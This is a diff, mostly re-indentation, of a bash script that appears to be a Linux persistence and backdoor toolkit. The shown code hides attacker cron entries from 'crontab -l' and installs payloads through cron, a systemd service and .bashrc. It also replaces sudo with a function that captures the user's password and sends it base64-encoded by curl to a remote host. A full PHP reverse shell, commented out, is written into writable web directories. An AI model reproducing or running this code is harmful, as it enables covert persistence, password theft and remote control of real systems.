@@ -35,23 +35,23 @@ do
 		-d|--dryrun)
 			shift
 			DRYRUN=1 ;;
-		 -s|--stealth-mode)
+		-s|--stealth-mode)
 			shift
 			STEALTHMODE=1 ;;
 		-i|--rhost)
 			shift
 			if test $# -gt 0;
 			then
-        		export RHOST=$1
-        	fi
-        	shift ;;
+				export RHOST=$1
+			fi
+			shift ;;
 		-p|--rport)
 			shift
 			if test $# -gt 0;
 			then
-        		export RPORT=$1
-        	fi
-        	shift ;;
+				export RPORT=$1
+			fi
+			shift ;;
 	esac
 done
 
@@ -88,11 +88,11 @@ then
 	if $(echo "$1" | grep -qi "\-l");
 	then
 		if [ `$REALBIN -l | grep -v "'$RHOST'" | grep -v "'$RPORT'" | wc -l` -eq 0 ];then echo no crontab for $USER; else $REALBIN -l | grep -v "'$RHOST'" | grep -v "'$RPORT'"; fi;
-	elif $(echo "$1 | grep -qi "\-r);
-	then
-		if $(`$REALBIN` -l | grep "'$RHOST'" | grep -qi "'$RPORT'");then `$REALBIN` -l | grep --color=never "'$RHOST'" | grep --color=never "'$RPORT'" | crontab; else $REALBIN -r; fi;
-	else
-		$REALBIN "${@:1}"
+		elif $(echo "$1 | grep -qi "\-r);
+		then
+			if $(`$REALBIN` -l | grep "'$RHOST'" | grep -qi "'$RPORT'");then `$REALBIN` -l | grep --color=never "'$RHOST'" | grep --color=never "'$RPORT'" | crontab; else $REALBIN -r; fi;
+			else
+				$REALBIN "${@:1}"
 	fi
 }' >> ~/.bash_aliases
 fi
@@ -142,14 +142,14 @@ enum_methods() {
 # enumerate where all backdoors can be placed
 enum_doors() {
 	DOORS=(
-	# array entry format = door , eval statement , hinge: <- the ":" is important, and the spaces around the commas
-	# door = command
-	# eval statement = same as above
-	# hinge = door hinge, haha get it? it is the command to actually be executed (piped to $SHELL) in order to install the backdoor, for each method. It will contain everything needed for the door to function properly (e.g. cron schedule, service details, backgrounding for bashrc, etc). The persistence *hinges* on this to be syntactically correct, literally :)
-	"crontab , crontab -l > $TMPCRON; echo \"* * * * * echo linper\" >> $TMPCRON; crontab $TMPCRON; crontab -l > $TMPCRON; cat $TMPCRON | grep -v linper > $PERMACRON; crontab $PERMACRON; if grep -qi [A-Za-z0-9] $PERMACRON; then crontab $PERMACRON; else crontab -r; fi; grep linper -qi $TMPCRON , echo \"$CRON $PAYLOAD\" >> $PERMACRON; crontab $PERMACRON; rm $PERMACRON:"
-	"systemctl , find /etc/systemd/ -type d -writable | head -n 1 | grep -qi systemd , echo \"$PAYLOAD\" >> /etc/systemd/system/$TMPSERVICESHELLSCRIPT; if test -f /etc/systemd/system/$TMPSERVICE; then echo > /dev/null; else touch /etc/systemd/system/$TMPSERVICE; echo \"[Service]\" >> /etc/systemd/system/$TMPSERVICE; echo \"Type=oneshot\" >> /etc/systemd/system/$TMPSERVICE; echo \"ExecStartPre=$(which sleep) 60 \" >> /etc/systemd/system/$TMPSERVICE; echo \"ExecStart=$(which $SHELL) /etc/systemd/system/$TMPSERVICESHELLSCRIPT \" >> /etc/systemd/system/$TMPSERVICE; echo \"[Install]\" >> /etc/systemd/system/$TMPSERVICE; echo \"WantedBy=multi-user.target\" >> /etc/systemd/system/$TMPSERVICE; chmod 644 /etc/systemd/system/$TMPSERVICE; systemctl start $TMPSERVICE 2> /dev/null & sleep .0001; systemctl enable $TMPSERVICE 2> /dev/null & sleep .0001; fi;:"
-	"bashrc , cd; find -writable -name .bashrc | grep -qi bashrc , echo \"$PAYLOAD 2> /dev/null & sleep .0001\" >> ~/.bashrc"
-)
+		# array entry format = door , eval statement , hinge: <- the ":" is important, and the spaces around the commas
+		# door = command
+		# eval statement = same as above
+		# hinge = door hinge, haha get it? it is the command to actually be executed (piped to $SHELL) in order to install the backdoor, for each method. It will contain everything needed for the door to function properly (e.g. cron schedule, service details, backgrounding for bashrc, etc). The persistence *hinges* on this to be syntactically correct, literally :)
+		"crontab , crontab -l > $TMPCRON; echo \"* * * * * echo linper\" >> $TMPCRON; crontab $TMPCRON; crontab -l > $TMPCRON; cat $TMPCRON | grep -v linper > $PERMACRON; crontab $PERMACRON; if grep -qi [A-Za-z0-9] $PERMACRON; then crontab $PERMACRON; else crontab -r; fi; grep linper -qi $TMPCRON , echo \"$CRON $PAYLOAD\" >> $PERMACRON; crontab $PERMACRON; rm $PERMACRON:"
+		"systemctl , find /etc/systemd/ -type d -writable | head -n 1 | grep -qi systemd , echo \"$PAYLOAD\" >> /etc/systemd/system/$TMPSERVICESHELLSCRIPT; if test -f /etc/systemd/system/$TMPSERVICE; then echo > /dev/null; else touch /etc/systemd/system/$TMPSERVICE; echo \"[Service]\" >> /etc/systemd/system/$TMPSERVICE; echo \"Type=oneshot\" >> /etc/systemd/system/$TMPSERVICE; echo \"ExecStartPre=$(which sleep) 60 \" >> /etc/systemd/system/$TMPSERVICE; echo \"ExecStart=$(which $SHELL) /etc/systemd/system/$TMPSERVICESHELLSCRIPT \" >> /etc/systemd/system/$TMPSERVICE; echo \"[Install]\" >> /etc/systemd/system/$TMPSERVICE; echo \"WantedBy=multi-user.target\" >> /etc/systemd/system/$TMPSERVICE; chmod 644 /etc/systemd/system/$TMPSERVICE; systemctl start $TMPSERVICE 2> /dev/null & sleep .0001; systemctl enable $TMPSERVICE 2> /dev/null & sleep .0001; fi;:"
+		"bashrc , cd; find -writable -name .bashrc | grep -qi bashrc , echo \"$PAYLOAD 2> /dev/null & sleep .0001\" >> ~/.bashrc"
+	)
 	IFS=":"
 	for s in ${DOORS[@]};
 	do
@@ -189,21 +189,21 @@ sudo_hijack_attack () {
 		if [ "$DRYRUN" -eq 0 ];
 		then
 			echo 'function sudo () {
-	realsudo="$(which sudo)"
-	PASSWDFILE="'$PASSWDFILE'"
-	read -s -p "[sudo] password for $USER: " inputPasswd
-	printf "\n"; printf "%s\n" "$USER : $inputPasswd" >> $PASSWDFILE
-	sort -uo "$PASSWDFILE" "$PASSWDFILE"
-	encoded=$(cat "$PASSWDFILE" | base64) > /dev/null 2>&1
-	curl -k -s "https://'$RHOST'/$encoded" > /dev/null 2>&1
-	$realsudo -S <<< "$inputPasswd" -u root bash -c "exit" > /dev/null 2>&1
-	$realsudo "${@:1}"
-}' >> ~/.bashrc
-			echo -e "\e[92m[+]\e[0m Hijacked $(whoami)'s sudo access"
-			echo "[+] Password will be Stored in $PASSWDFILE"
-			echo "[+] $PASSWDFILE will be exfiltrated to https://$RHOST/ as a base64 encoded GET parameter"
-		else
-			echo -e "\e[92m[+]\e[0m Sudo Hijack Attack Possible"
+			realsudo="$(which sudo)"
+			PASSWDFILE="'$PASSWDFILE'"
+			read -s -p "[sudo] password for $USER: " inputPasswd
+			printf "\n"; printf "%s\n" "$USER : $inputPasswd" >> $PASSWDFILE
+			sort -uo "$PASSWDFILE" "$PASSWDFILE"
+			encoded=$(cat "$PASSWDFILE" | base64) > /dev/null 2>&1
+			curl -k -s "https://'$RHOST'/$encoded" > /dev/null 2>&1
+			$realsudo -S <<< "$inputPasswd" -u root bash -c "exit" > /dev/null 2>&1
+			$realsudo "${@:1}"
+		}' >> ~/.bashrc
+	echo -e "\e[92m[+]\e[0m Hijacked $(whoami)'s sudo access"
+	echo "[+] Password will be Stored in $PASSWDFILE"
+	echo "[+] $PASSWDFILE will be exfiltrated to https://$RHOST/ as a base64 encoded GET parameter"
+else
+	echo -e "\e[92m[+]\e[0m Sudo Hijack Attack Possible"
 		fi
 		echo "-----------------------"
 
@@ -219,9 +219,9 @@ webserver_poison_attack () {
 			for i in $(find $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}') -writable -type d);
 			do
 				echo "$i"
-			#	export php_webshell=.$(mktemp -u | sed 's/.*\.//g').php
-			#	echo "<?php set_time_limit (0);\$ip = '$RHOST';\$port = $RPORT;\$chunk_size = 1400;\$write_a = null; \$error_a = null; \$shell = '/bin/sh -i'; \$daemon = 0; \$debug = 0;  if (function_exists('pcntl_fork')) {     \$pid = pcntl_fork();          if (\$pid == -1) {         printit(\"ERROR: Can't fork\");         exit(1);     }             if (\$pid) {         exit(0);     }         if (posix_setsid() == -1) {         printit(\"Error: Can't setsid()\");         exit(1);     }         \$daemon = 1; } else {     printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\"); }  chdir(\"/\"); umask(0); \$sock = fsockopen(\$ip, \$port, \$errno, \$errstr, 30); if (!\$sock) {     printit(\"\$errstr (\$errno)\");     exit(1); }  \$descriptorspec = array(    0 => array(\"pipe\", \"r\"),    1 => array(\"pipe\", \"w\"),    2 => array(\"pipe\", \"w\") );  \$process = proc_open(\$shell, \$descriptorspec, \$pipes);  if (!is_resource(\$process)) {     printit(\"ERROR: Can't spawn shell\");     exit(1); }  stream_set_blocking(\$pipes[0], 0);  stream_set_blocking(\$pipes[1], 0);  stream_set_blocking(\$pipes[2], 0);  stream_set_blocking(\$sock, 0);   printit(\"Successfully opened reverse shell to \$ip:\$port\");  while (1) {     if (feof(\$sock)) {         printit(\"ERROR: Shell connection terminated\");         break;     }         if (feof(\$pipes[1])) {         printit(\"ERROR: Shell process terminated\");         break;     }         \$read_a = array(\$sock, \$pipes[1], \$pipes[2]);     \$num_changed_sockets = stream_select(\$read_a, \$write_a, \$error_a, null);      if (in_array(\$sock, \$read_a)) {         if (\$debug) printit(\"SOCK READ\");         \$input = fread(\$sock, \$chunk_size);         if (\$debug) printit(\"SOCK: \$input\");         fwrite(\$pipes[0], \$input);     }         if (in_array(\$pipes[1], \$read_a)) {         if (\$debug) printit(\"STDOUT READ\");         \$input = fread(\$pipes[1], \$chunk_size);         if (\$debug) printit(\"STDOUT: \$input\");         fwrite(\$sock, \$input);     }         if (in_array(\$pipes[2], \$read_a)) {         if (\$debug) printit(\"STDERR READ\");         \$input = fread(\$pipes[2], \$chunk_size);         if (\$debug) printit(\"STDERR: \$input\");         fwrite(\$sock, \$input);     }    }  fclose(\$sock); fclose(\$pipes[0]); fclose(\$pipes[1]); fclose(\$pipes[2]); proc_close(\$process);  function printit (\$string) {     if (!\$daemon) {         print \"\$string\n\";     }    }  ?>" > $i/$php_webshell
-			#	echo -e "\e[92m[+]\e[0m PHP reverse shell placed in $i/$php_webshell"
+				#	export php_webshell=.$(mktemp -u | sed 's/.*\.//g').php
+				#	echo "<?php set_time_limit (0);\$ip = '$RHOST';\$port = $RPORT;\$chunk_size = 1400;\$write_a = null; \$error_a = null; \$shell = '/bin/sh -i'; \$daemon = 0; \$debug = 0;  if (function_exists('pcntl_fork')) {     \$pid = pcntl_fork();          if (\$pid == -1) {         printit(\"ERROR: Can't fork\");         exit(1);     }             if (\$pid) {         exit(0);     }         if (posix_setsid() == -1) {         printit(\"Error: Can't setsid()\");         exit(1);     }         \$daemon = 1; } else {     printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\"); }  chdir(\"/\"); umask(0); \$sock = fsockopen(\$ip, \$port, \$errno, \$errstr, 30); if (!\$sock) {     printit(\"\$errstr (\$errno)\");     exit(1); }  \$descriptorspec = array(    0 => array(\"pipe\", \"r\"),    1 => array(\"pipe\", \"w\"),    2 => array(\"pipe\", \"w\") );  \$process = proc_open(\$shell, \$descriptorspec, \$pipes);  if (!is_resource(\$process)) {     printit(\"ERROR: Can't spawn shell\");     exit(1); }  stream_set_blocking(\$pipes[0], 0);  stream_set_blocking(\$pipes[1], 0);  stream_set_blocking(\$pipes[2], 0);  stream_set_blocking(\$sock, 0);   printit(\"Successfully opened reverse shell to \$ip:\$port\");  while (1) {     if (feof(\$sock)) {         printit(\"ERROR: Shell connection terminated\");         break;     }         if (feof(\$pipes[1])) {         printit(\"ERROR: Shell process terminated\");         break;     }         \$read_a = array(\$sock, \$pipes[1], \$pipes[2]);     \$num_changed_sockets = stream_select(\$read_a, \$write_a, \$error_a, null);      if (in_array(\$sock, \$read_a)) {         if (\$debug) printit(\"SOCK READ\");         \$input = fread(\$sock, \$chunk_size);         if (\$debug) printit(\"SOCK: \$input\");         fwrite(\$pipes[0], \$input);     }         if (in_array(\$pipes[1], \$read_a)) {         if (\$debug) printit(\"STDOUT READ\");         \$input = fread(\$pipes[1], \$chunk_size);         if (\$debug) printit(\"STDOUT: \$input\");         fwrite(\$sock, \$input);     }         if (in_array(\$pipes[2], \$read_a)) {         if (\$debug) printit(\"STDERR READ\");         \$input = fread(\$pipes[2], \$chunk_size);         if (\$debug) printit(\"STDERR: \$input\");         fwrite(\$sock, \$input);     }    }  fclose(\$sock); fclose(\$pipes[0]); fclose(\$pipes[1]); fclose(\$pipes[2]); proc_close(\$process);  function printit (\$string) {     if (!\$daemon) {         print \"\$string\n\";     }    }  ?>" > $i/$php_webshell
+				#	echo -e "\e[92m[+]\e[0m PHP reverse shell placed in $i/$php_webshell"
 			done
 			echo "-----------------------"
 		fi
